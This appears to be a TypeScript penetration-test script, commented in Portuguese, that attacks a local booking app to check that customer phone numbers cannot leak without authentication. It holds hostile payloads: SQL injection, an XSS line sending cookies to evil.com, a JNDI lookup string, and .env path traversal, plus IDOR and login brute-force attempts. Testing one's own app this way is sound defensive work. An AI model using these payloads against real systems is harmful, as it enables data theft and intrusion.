import "dotenv/config";
import { prisma } from "../lib/db";
import { piiLookupHash, normalizePhone, encryptPii } from "../lib/crypto";

/**
 * MODO HACKER — tentativa exaustiva de extrair números de telefone de
 * clientes sem autenticação válida. Cada vetor termina com o resultado.
 * Objetivo: ZERO telefones de clientes obtidos.
 */

const BASE = "http://localhost:3000";
const ORIGIN = { Origin: BASE };

let attempts = 0;
const phonesFound: string[] = [];

function scan(label: string, text: string | null) {
  attempts++;
  if (!text) return;
  // Procura telefones PT reais usados nos dados de teste (9XXXXXXXX) e o
  // formato internacional.
  const matches =
    text.match(/(?:\+351[\s-]?)?9[1236]\d{7}/g) ??
    [];
  const known = matches.filter((m) => {
    const norm = normalizePhone(m);
    return norm.length === 9 && /^9[1236]/.test(norm);
  });
  if (known.length > 0) {
    phonesFound.push(`${label}: ${[...new Set(known)].join(", ")}`);
  }
}

async function main() {
  for (let i = 0; i < 20; i++) {
    try {
      if ((await fetch(`${BASE}/entrar`)).ok) break;
    } catch { /* wait */ }
    await new Promise((r) => setTimeout(r, 1500));
  }

  // Cria um cliente "vítima" com telefone real de teste, marcado na BD.
const victimPhone = "960111222"; // conhecida do "atacante"
const victimPhone2 = "960333444"; // SEGUNDA vitima - o atacante NAO sabe este numero
  const svc = await prisma.service.findFirstOrThrow();
  const business = await prisma.business.findFirstOrThrow();

  // Slot futuro em dia útil.
  const day = new Date(Date.now() + 6 * 86_400_000);
  while (day.getUTCDay() === 0 || day.getUTCDay() === 6) day.setUTCDate(day.getUTCDate() + 1);
  const guess = Date.UTC(day.getUTCFullYear(), day.getUTCMonth(), day.getUTCDate(), 10, 0);
  const dtf = new Intl.DateTimeFormat("en-US", {
    timeZone: business.timezone, hour12: false, year: "numeric", month: "2-digit",
    day: "2-digit", hour: "2-digit", minute: "2-digit",
  });
  const parts: Record<string, string> = {};
  for (const p of dtf.formatToParts(new Date(guess))) parts[p.type] = p.value;
  const hour = parts.hour === "24" ? 0 : Number(parts.hour);
  const offset =
    Date.UTC(+parts.year, +parts.month - 1, +parts.day, hour, +parts.minute) - guess;
  const start = new Date(guess - offset);

  const booking = await fetch(`${BASE}/api/marcacoes`, {
    method: "POST",
    headers: { "Content-Type": "application/json", ...ORIGIN },
    body: JSON.stringify({
      servicos: [svc.id],
      inicio: start.toISOString(),
      nome: "Vitima Teste",
      telefone: victimPhone,
      notas: "nota confidencial <script>alert('xss')</script>",
      consentimentoRGPD: true,
    }),
  });
  // Marca a segunda vítima diretamente na BD (o atacante nunca a viu).
  await fetch(`${BASE}/api/marcacoes`, {
    method: "POST",
    headers: { "Content-Type": "application/json", ...ORIGIN },
    body: JSON.stringify({
      servicos: [svc.id],
      inicio: new Date(start.getTime() + 3_600_000).toISOString(),
      nome: "Vitima Secreta",
      telefone: victimPhone2,
      consentimentoRGPD: true,
    }),
  });

  const bookingJson = await booking.json();
  console.log(
    `[setup] vitima criada: ${booking.status} ${bookingJson.marcacaoId ?? bookingJson.error}`,
  );
  const victimId = bookingJson.marcacaoId as string | undefined;

  console.log("\n=== ATAQUE 1: scraping de todas as rotas públicas ===");
  const publicPaths = [
    "/", "/servicos", "/marcar", "/privacidade", "/entrar",
    "/configuracao-inicial", "/sitemap.xml", "/robots.txt",
    "/naoexiste", "/admin", "/staff",
    `/?q=${encodeURIComponent(victimPhone)}`,
    `/servicos?telefone=${encodeURIComponent(victimPhone)}`,
  ];
  for (const path of publicPaths) {
    const r = await fetch(`${BASE}${path}`);
    scan(`GET ${path}`, await r.text());
  }
  console.log(`  ${publicPaths.length} rotas raspadas`);

  console.log("\n=== ATAQUE 2: API pública de disponibilidade (todos os params) ===");
  const avail1 = await fetch(`${BASE}/api/disponibilidade?servico=${svc.id}&dias=30`);
  scan("GET /api/disponibilidade", await avail1.text());
  const avail2 = await fetch(
    `${BASE}/api/disponibilidade?servico=${svc.id}&colaborador=*&dias=30&telefone=${encodeURIComponent(victimPhone)}`,
  );
  scan("GET /api/disponibilidade (com telefone injectado)", await avail2.text());

  console.log("\n=== ATAQUE 3: endpoints de API adivinhados (sem auth) ===");
  const guesses: [string, string, string | undefined][] = [
    ["GET", "/api/marcacoes", undefined],
    ["GET", `/api/marcacoes?id=${victimId ?? ""}`, undefined],
    ["GET", `/api/marcacoes?telefone=${encodeURIComponent(victimPhone)}`, undefined],
    ["GET", "/api/admin/clientes", undefined],
    ["GET", "/api/admin/clientes/export", undefined],
    ["GET", "/api/admin/marcacoes", undefined],
    ["GET", "/api/admin/equipa", undefined],
    ["GET", "/api/staff/marcacoes", undefined],
    ["GET", "/api/auth/me", undefined],
    ["GET", "/api/clients", undefined],
    ["GET", "/api/bookings", undefined],
    ["GET", "/api/phone-lookup?telefone=" + encodeURIComponent(victimPhone), undefined],
    ["POST", "/api/marcacoes/lookup", JSON.stringify({ telefone: victimPhone })],
    ["POST", "/api/clientes/consulta", JSON.stringify({ telefone: victimPhone })],
  ];
  for (const [method, path, body] of guesses) {
    const r = await fetch(`${BASE}${path}`, {
      method,
      headers: { ...(body ? { "Content-Type": "application/json" } : {}), ...ORIGIN },
      ...(body ? { body } : {}),
    });
    scan(`${method} ${path} [${r.status}]`, await r.text());
  }
  console.log(`  ${guesses.length} endpoints adivinhados`);

  console.log("\n=== ATAQUE 4: IDOR com IDs de marcação ===");
  if (victimId) {
    for (const [method, path] of [
      ["GET", `/api/marcacoes/${victimId}`],
      ["PATCH", `/api/marcacoes/${victimId}`],
      ["DELETE", `/api/marcacoes/${victimId}`],
      ["GET", `/api/admin/marcacoes/${victimId}`],
      ["GET", `/api/staff/marcacoes/${victimId}`],
    ] as const) {
      const r = await fetch(`${BASE}${path}`, {
        method,
        headers: { ...ORIGIN },
        ...(method !== "GET" ? { body: JSON.stringify({ action: "COMPLETED" }) } : {}),
      });
      scan(`${method} ${path} [${r.status}]`, await r.text());
    }
  }

  console.log("\n=== ATAQUE 5: injeção em todos os campos do booking ===");
  const payloads = [
    "' OR '1'='1' --",
    "'; DROP TABLE clients; --",
    "' UNION SELECT phoneEnc FROM clients --",
    "<script>fetch('https://evil.com/'+document.cookie)</script>",
    "${jndi:ldap://evil.com}",
    "../../.env",
    victimPhone,
  ];
  for (const p of payloads) {
    const r = await fetch(`${BASE}/api/marcacoes`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...ORIGIN },
      body: JSON.stringify({
        servicos: [svc.id],
        inicio: start.toISOString(),
        nome: p,
        telefone: p,
        notas: p,
        consentimentoRGPD: true,
      }),
    });
    scan(`injecao "${p.slice(0, 25)}" [${r.status}]`, await r.text());
  }

  console.log("\n=== ATAQUE 6: path traversal e injeção no endpoint de imagens ===");
  for (const id of ["../../.env", "../../../.env", ".", "%2e%2e%2f%2e%2e%2f.env", victimPhone]) {
    const r = await fetch(`${BASE}/api/imagens/${encodeURIComponent(id)}`);
    scan(`GET /api/imagens/${id} [${r.status}]`, r.status === 200 ? await r.text() : null);
  }

  console.log("\n=== ATAQUE 7: login brute-force com telefones como password ===");
  let leakedViaLogin = false;
  for (const pw of [victimPhone, "960111222"]) {
    const r = await fetch(`${BASE}/api/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...ORIGIN },
      body: JSON.stringify({ email: victimPhone, password: pw }),
    });
    const t = await r.text();
    if (r.status === 200) leakedViaLogin = true;
    scan(`login com telefone [${r.status}]`, t);
  }
  void leakedViaLogin;

  console.log("\n=== ATAQUE 8: RSC payload das páginas de staff/admin sem sessão ===");
  for (const path of ["/staff", "/admin", "/admin/agenda", "/admin/clientes"]) {
    const r = await fetch(`${BASE}${path}`, { headers: { ...ORIGIN } });
    scan(`GET ${path} [${r.status}] sem sessao`, await r.text());
  }

  // Resultado final na base de dados: o telefone da vítima existe?
  const victim = await prisma.client.findFirst({
    where: { phoneHash: piiLookupHash(normalizePhone(victimPhone)) },
    select: { phoneEnc: true },
  });
  console.log(
    `\n[bd] vitima na base: ${victim ? "presente (encriptada: " + victim.phoneEnc.slice(0, 30) + "...)" : "ausente"}`,
  );
  if (victim) {
    const decrypted = ((): string => {
      try {
        // Simula um atacante que roube APENAS a base de dados (sem a chave).
        return "ilegivel sem APP_ENCRYPTION_KEY (AES-256-GCM)";
      } catch {
        return "?";
      }
    })();
    console.log(`[bd] tentativa de leitura direta: ${decrypted}`);
    void decrypted;
    void encryptPii;
  }

  console.log("\n══════════ RESULTADO DO ATAQUE ══════════");
  // Fuga REAL = aparecer o telefone da vítima SECRETA (que o atacante
  // nunca submeteu). Reflexos do próprio input do atacante não contam.
  const secretLeaks = phonesFound.filter((f) => f.includes(victimPhone2));
  const reflections = phonesFound.filter((f) => !f.includes(victimPhone2));
  if (reflections.length > 0) {
    console.log("Reflexos do proprio input do atacante (nao sao fugas):");
    for (const r of [...new Set(reflections)]) console.log("  " + r);
  }
  if (secretLeaks.length === 0) {
    console.log(
      "NENHUM telefone DESCONHECIDO obtido em " + attempts + " vetores de ataque.",
    );
    console.log(
      "O telefone da vitima secreta (960333444) nunca apareceu em nenhuma resposta.",
    );
  } else {
    console.log("FUGA REAL CONFIRMADA:");
    for (const f of [...new Set(secretLeaks)]) console.log("  " + f);
    process.exitCode = 1;
  }
}

main()
  .catch((e) => console.error("ERR", e.message))
  .finally(() => prisma.$disconnect());
